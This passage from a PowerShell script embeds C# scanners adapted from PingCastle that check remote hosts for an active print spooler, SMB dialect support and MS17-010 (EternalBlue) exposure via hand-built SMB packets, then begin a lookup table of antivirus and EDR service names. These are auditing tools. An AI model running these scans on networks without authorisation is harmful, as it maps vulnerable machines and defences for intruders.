            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            bindinghandle.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            //Trace.WriteLine("allocating " + memory.ToString());
            return memory;
        }

        delegate void freememory(IntPtr memory);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static void FreeMemory(IntPtr memory)
        {
            //Trace.WriteLine("freeing " + memory.ToString());
            Marshal.FreeHGlobal(memory);
        }

        delegate IntPtr bind(IntPtr IntPtrserver);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr Bind (IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;

            Trace.WriteLine("Binding to " + server + " " + PipeName);
            status = RpcStringBindingCompose(null, "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Trace.WriteLine("RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Trace.WriteLine("RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Trace.WriteLine("binding ok (handle=" + binding + ")");
            return binding;
        }

        delegate void unbind(IntPtr IntPtrserver, IntPtr hBinding);
        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected static void Unbind(IntPtr IntPtrserver, IntPtr hBinding)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            Trace.WriteLine("unbinding " + server);
            RpcBindingFree(ref hBinding);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
        
        public bool CheckIfTheSpoolerIsActive(string computer)
		{
			IntPtr hHandle = IntPtr.Zero;

			DEVMODE_CONTAINER devmodeContainer = new DEVMODE_CONTAINER();
			try
			{
				Int32 ret = RpcOpenPrinter("\\\\" + computer, out hHandle, null, ref devmodeContainer, 0);
				if (ret == 0)
				{
					return true;
				}
			}
			finally
			{
				if (hHandle != IntPtr.Zero)
					RpcClosePrinter(ref hHandle);
			}
			return false;
		}
    }

}
"@
	    Add-Type -TypeDefinition $sourceSpooler
	    $rprn = New-Object PingCastle.ExtractedCode.rprn
	    $list = New-Object System.Collections.ArrayList
	    $ComputerNames | foreach {
	    	$data = New-Object  PSObject -Property @{
	    		"ComputerName" = $_
	    		"Status"       = $rprn.CheckIfTheSpoolerIsActive($_)
	    	}
	    	$list.add($data) | Out-Null
	    }
	    return $list
    }
    Function local:Get-SMBv1Status {
        <#
        .OUTPUT
        PS > Get-SMBv1Status -ComputerNames 'localhost'
        ComputerName Status
        ------------ ------
        localhost     False
        #>
        Param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            $ComputerNames
        )
        $Source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace PingCastle.Scanners
{
    public class SmbScanner
	{
        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)] 
			public byte Command;
			[FieldOffset(5)] 
			public int Status;
			[FieldOffset(9)] 
			public byte  Flags;
			[FieldOffset(10)] 
			public UInt16 Flags2;
			[FieldOffset(12)] 
			public UInt16 PIDHigh;
			[FieldOffset(14)] 
			public UInt64 SecurityFeatures;
			[FieldOffset(22)] 
			public UInt16 Reserved;
			[FieldOffset(24)] 
			public UInt16 TID;
			[FieldOffset(26)] 
			public UInt16 PIDLow;
			[FieldOffset(28)] 
			public UInt16 UID;
			[FieldOffset(30)] 
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}

        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}

		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;

		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;

		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;

		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;

		const int SMB_FLAGS2_ESS							= 0x0800;

		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;

		const int SMB_DB_FORMAT_DIALECT = 0x02;

		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}

		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}

		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];

			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}

		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}

		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}

		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}

		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}

		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                    return false;
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                    return false;
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                    return false;
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}

		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                    return false;
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                    return false;
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                    return false;
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}

		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202) || DoesServerSupportDialectWithSmbV2(server, 0x0210));
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300) || DoesServerSupportDialectWithSmbV2(server, 0x0302) || DoesServerSupportDialectWithSmbV2(server, 0x0311));
			}
			catch (Exception)
			{
				return false;
			}
		}

		public static string Name { get { return "smb"; } }
        
		public static string GetCsvHeader()
		{
			return "Computer\tSMB Port Open\tSMB1(NT LM 0.12)\tSMB2(0x0202)\tSMB2(0x0210)\tSMB3(0x0300)\tSMB3(0x0302)\tSMB3(0x0311)";
		}

		public static string GetCsvData(string computer)
		{
			bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv2_0x0300 = false;
			bool SMBv2_0x0302 = false;
			bool SMBv2_0x0311 = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210);
					SMBv2_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300);
					SMBv2_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302);
					SMBv2_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			return computer + "\t" + (isPortOpened ? "Yes" : "No") + "\t" + (SMBv1 ? "Yes" : "No")
															+ "\t" + (SMBv2_0x0202 ? "Yes" : "No")
															+ "\t" + (SMBv2_0x0210 ? "Yes" : "No")
															+ "\t" + (SMBv2_0x0300 ? "Yes" : "No")
															+ "\t" + (SMBv2_0x0302 ? "Yes" : "No")
															+ "\t" + (SMBv2_0x0311 ? "Yes" : "No");
		}
		
        public static void GetCsv(string computer)
        {
            Console.WriteLine(GetCsvHeader());
            Console.WriteLine(GetCsvData(computer));
        }
	}
}
"@
        Add-Type -TypeDefinition $Source
        $list = New-Object System.Collections.ArrayList
	    $ComputerNames | foreach {
	    	$data = New-Object  PSObject -Property @{
	    		"ComputerName" = $_
	    		"Status"       = ([PingCastle.Scanners.SmbScanner]::SupportSMB1($_))
	    	}
	    	$list.add($data) | Out-Null
	    }
        return $list
    }
    function local:Get-EternalBlueStatus {
        Param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            $ComputerNames
        )
        $Source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PingCastle.Scanners
{
	public class ms17_010scanner
	{
		static public bool ScanForMs17_010(string computer)
		{
			Trace.WriteLine("Checking " + computer + " for MS17-010");
			TcpClient client = new TcpClient();
			client.Connect(computer, 445);
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] negotiatemessage = GetNegotiateMessage();
				stream.Write(negotiatemessage, 0, negotiatemessage.Length);
				stream.Flush();
				byte[] response = ReadSmbResponse(stream);
				if (!(response[8] == 0x72 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid negotiate response");
				}
				byte[] sessionSetup = GetSessionSetupAndXRequest(response);
				stream.Write(sessionSetup, 0, sessionSetup.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x73 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid sessionSetup response");
				}
				byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);
				stream.Write(treeconnect, 0, treeconnect.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x75 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid TreeConnect response");
				}
				byte[] peeknamedpipe = GetPeekNamedPipe(response);
				stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )
				{
					return true;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return false;
		}

		private static byte[] ReadSmbResponse(NetworkStream stream)
		{
			byte[] temp = new byte[4];
			stream.Read(temp, 0, 4);
			int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;
			byte[] output = new byte[size + 4];
			stream.Read(output, 4, size);
			Array.Copy(temp, output, 4);
			return output;
		}

		static byte[] GetNegotiateMessage()
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, // Session Message
				0xff,0x53,0x4d,0x42, // Server Component: SMB
				0x72, // SMB Command: Negotiate Protocol (0x72)
				0x00, // Error Class: Success (0x00)
				0x00, // Reserved
				0x00,0x00, // Error Code: No Error
				0x18, // Flags
				0x01,0x28, // Flags 2
				0x00,0x00, // Process ID High 0
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // Signature
				0x00,0x00, // Reserved
				0x00,0x00, // Tree id 0
				0x44,0x6d, // Process ID 27972
				0x00,0x00, // User ID 0
				0x42,0xc1, // Multiplex ID 49474
				0x00, // WCT 0
				0x31,0x00, // BCC 49
				0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00, // LANMAN1.0
				0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00, // LM1.2X002
				0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00, // NT LANMAN 1.0
				0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00, // NT LM 0.12
			};
			return EncodeNetBiosLength(output);
		}

		static byte[] GetSessionSetupAndXRequest(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, // Session Message
				0xff,0x53,0x4d,0x42, // Server Component: SMB
				0x73, // SMB Command: Session Setup AndX (0x73)
				0x00, // Error Class: Success (0x00)
				0x00, // Reserved
				0x00,0x00, // Error Code: No Error
				0x18, // Flags
				0x01,0x28, // Flags 2
				0x00,0x00, // Process ID High 0
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // Signature
				0x00,0x00, // Reserved
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1, // Multiplex ID 49474
				0x0d, // WCT 0
				0xff, // AndXCommand: No further commands (0xff)
				0x00, // Reserved 00
				0x00,0x00, // AndXOffset: 0
				0xdf,0xff, // Max Buffer: 65503
				0x02,0x00, // Max Mpx Count: 2
				0x01,0x00, // VC Number: 1
				0x00,0x00,0x00,0x00, // Session Key: 0x00000000
				0x00,0x00, // ANSI Password Length: 0
				0x00,0x00, // Unicode Password Length: 0
				0x00,0x00,0x00,0x00, // Reserved: 00000000
				0x40,0x00,0x00,0x00, // Capabilities: 0x00000040, NT Status Codes
				0x26,0x00, // Byte Count (BCC): 38
				0x00, // Account:
				0x2e,0x00, // Primary Domain: .
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00, // Native OS: Windows 2000 2195
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00 // Native LAN Manager: Windows 2000 5.0
			};
			return EncodeNetBiosLength(output);
		}

		private static byte[] EncodeNetBiosLength(byte[] input)
		{
			byte[] len = BitConverter.GetBytes(input.Length-4);
			input[3] = len[0];
			input[2] = len[1];
			input[1] = len[2];
			return input;
		}

		static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] part1 = new byte[] {
				0x00,0x00,0x00,0x00, // Session Message
				0xff,0x53,0x4d,0x42, // Server Component: SMB
				0x75, // SMB Command: Tree Connect AndX (0x75)
				0x00, // Error Class: Success (0x00)
				0x00, // Reserved
				0x00,0x00, // Error Code: No Error
				0x18, // Flags
				0x01,0x28, // Flags 2
				0x00,0x00, // Process ID High 0
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // Signature
				0x00,0x00, // Reserved
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1, // Multiplex ID 49474
				0x04, // WCT 4
				0xff, // AndXCommand: No further commands (0xff)
				0x00, // Reserved: 00
				0x00,0x00, // AndXOffset: 0
				0x00,0x00, // Flags: 0x0000
				0x01,0x00, // Password Length: 1
				0x19,0x00, // Byte Count (BCC): 25
				0x00, // Password: 00
				0x5c,0x5c};
			byte[] part2 = new byte[] {
				0x5c,0x49,0x50,0x43,0x24,0x00, // Path: \\ip_target\IPC$
				0x3f,0x3f,0x3f,0x3f,0x3f,0x00
			};
			ms.Write(part1, 0, part1.Length);
			byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);
			ms.Write(encodedcomputer, 0, encodedcomputer.Length);
			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return EncodeNetBiosLength(output);
		}

		static byte[] GetPeekNamedPipe(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00, // Session Message
				0xff,0x53,0x4d,0x42, // Server Component: SMB
				0x25, // SMB Command: Trans (0x25)
				0x00, // Error Class: Success (0x00)
				0x00, // Reserved
				0x00,0x00, // Error Code: No Error
				0x18, // Flags
				0x01,0x28, // Flags 2
				0x00,0x00, // Process ID High 0
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // Signature
				0x00,0x00, // Reserved
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1, // Multiplex ID 49474
				0x10, // Word Count (WCT): 16
				0x00,0x00, // Total Parameter Count: 0
				0x00,0x00, // Total Data Count: 0
				0xff,0xff, // Max Parameter Count: 65535
				0xff,0xff, // Max Data Count: 65535
				0x00, // Max Setup Count: 0
				0x00, // Reserved: 00
				0x00,0x00, // Flags: 0x0000
				0x00,0x00,0x00,0x00, // Timeout: Return immediately (0)
				0x00,0x00, // Reserved: 0000
				0x00,0x00, // Parameter Count: 0
				0x4a,0x00, // Parameter Offset: 74
				0x00,0x00, // Data Count: 0
				0x4a,0x00, // Data Offset: 74
				0x02, // Setup Count: 2
				0x00, // Reserved: 00
				0x23,0x00, // Function: PeekNamedPipe (0x0023)
				0x00,0x00, // FID: 0x0000
				0x07,0x00, // Byte Count (BCC): 7
				0x5c,0x50,0x49,0x50,0x45,0x5c,0x00 // Transaction Name: \PIPE\
			};
			return EncodeNetBiosLength(output);
		}
	}
}
"@
        Add-Type -TypeDefinition $Source
        $list = New-Object System.Collections.ArrayList
	    $ComputerNames | foreach {
            try{
	    	    $data = New-Object  PSObject -Property @{
	    	    	"ComputerName" = $_
	    	    	"Status"       = [PingCastle.Scanners.ms17_010scanner]::ScanForMs17_010($_)
                }
                $list.add($data) | Out-Null
            }catch{}
	    }
        return $list
    }
    function local:Get-AntiVirusStatus {
        Param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            $ComputerNames
        )
        $source = @"
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;

namespace PingCastle
{
    public class TestAV
    {

      [DllImport("advapi32.dll", SetLastError = true)]
		static extern bool LookupAccountName(
			string lpSystemName,
			string lpAccountName,
			[MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
			ref uint cbSid,
			StringBuilder ReferencedDomainName,
			ref uint cchReferencedDomainName,
			out SID_NAME_USE peUse);


        const int NO_ERROR = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 122;
        const int ERROR_INVALID_FLAGS = 1004;

        public enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

		public static SecurityIdentifier ConvertNameToSID(string accountName, string server)
		{
			byte [] Sid = null;
			uint cbSid = 0;
			StringBuilder referencedDomainName = new StringBuilder();
			uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
			SID_NAME_USE sidUse;

			int err = NO_ERROR;
			if (LookupAccountName(server, accountName, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out sidUse))
			{
				return new SecurityIdentifier(Sid, 0);
			}
			else
			{
				err = Marshal.GetLastWin32Error();
				if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
				{
					Sid = new byte[cbSid];
					referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
					err = NO_ERROR;
					if (LookupAccountName(null, accountName, Sid, ref cbSid, referencedDomainName, ref cchReferencedDomainName, out sidUse))
					{
						return new SecurityIdentifier(Sid, 0);
					}
				}
			}
			return null;
		}

        static Dictionary<string, string> AVReference = new Dictionary<string, string>{
			
			{"avast! Antivirus", "Avast"},
			{"aswBcc", "Avast"},
			{"Avast Business Console Client Antivirus Service", "Avast"},

			{"epag", "Bitdefender Endpoint Agent"},
			{"EPIntegrationService", "Bitdefender Endpoint Integration Service"},
			{"EPProtectedService", "Bitdefender Endpoint Protected Service"},
			{"epredline", "Bitdefender Endpoint Redline Services"},
			{"EPSecurityService", "Bitdefender Endpoint Security Service"},
			{"EPUpdateService", "Bitdefender Endpoint Update Service"},

			{"CylanceSvc", "Cylance"}, 

			{"epfw", "ESET"}, 
			{"epfwlwf", "ESET"}, 
			{"epfwwfp" , "ESET"}, 

			{"xagt" , "FireEye Endpoint Agent"}, 

			{"fgprocsvc" , "ForeScout Remote Inspection Service"}, 
			{"SecureConnector" , "ForeScout SecureConnector Service"}, 

			{"fsdevcon", "F-Secure"},
			{"FSDFWD", "F-Secure"},
			{"F-Secure Network Request Broker", "F-Secure"},
			{"FSMA", "F-Secure"},
			{"FSORSPClient", "F-Secure"},

			{"klif", "Kasperksky"},
			{"klim", "Kasperksky"},
			{"kltdi", "Kasperksky"},
			{"kavfsslp", "Kasperksky"},
			{"KAVFSGT", "Kasperksky"},
			{"KAVFS", "Kasperksky"},
			
			{"enterceptagent", "MacAfee"},
			{"macmnsvc", "MacAfee Agent Common Services"},
			{"masvc", "MacAfee Agent Service"},
			{"McAfeeFramework", "MacAfee Agent Backwards Compatiblity Service"},
			{"McAfeeEngineService", "MacAfee"},
			{"mfefire", "MacAfee Firewall Core Service"},
			{"mfemms", "MacAfee Service Controller"},
			{"mfevtp", "MacAfee Validation Trust Protection Service"},
			{"mfewc", "MacAfee Endpoint Security Web Control Service"},
			
			{"cyverak", "PaloAlto Traps KernelDriver"},
			{"cyvrmtgn", "PaloAlto Traps KernelDriver"},
			{"cyvrfsfd", "PaloAlto Traps FileSystemDriver"},
			{"cyserver", "PaloAlto Traps Reporting Service"},
			{"CyveraService", "PaloAlto Traps"},
			{"tlaservice", "PaloAlto Traps Local Analysis Service"},
			{"twdservice", "PaloAlto Traps Watchdog Service"},
			
			{"SentinelAgent", "SentinelOne"},
			{"SentinelHelperService", "SentinelOne"},
			{"SentinelStaticEngine ", "SentinelIbe Static Service"},
			{"LogProcessorService ", "SentinelOne Agent Log Processing Service"},

			{"sophosssp", "Sophos"},
			{"Sophos Agent", "Sophos"},
			{"Sophos AutoUpdate Service", "Sophos"},
			{"Sophos Clean Service", "Sophos"},
			{"Sophos Device Control Service", "Sophos"},
			{"Sophos File Scanner Service", "Sophos"},
			{"Sophos Health Service", "Sophos"},
			{"Sophos MCS Agent", "Sophos"},
			{"Sophos MCS Client", "Sophos"},
			{"Sophos Message Router", "Sophos"},
			{"Sophos Safestore Service", "Sophos"},
			{"Sophos System Protection Service", "Sophos"},
			{"Sophos Web Control Service", "Sophos"},
			{"sophossps", "Sophos"},

			{"SepMasterService" , "Symantec Endpoint Protection"},
			{"SNAC" , "Symantec Network Access Control"},
			{"Symantec System Recovery" , "Symantec System Recovery"},
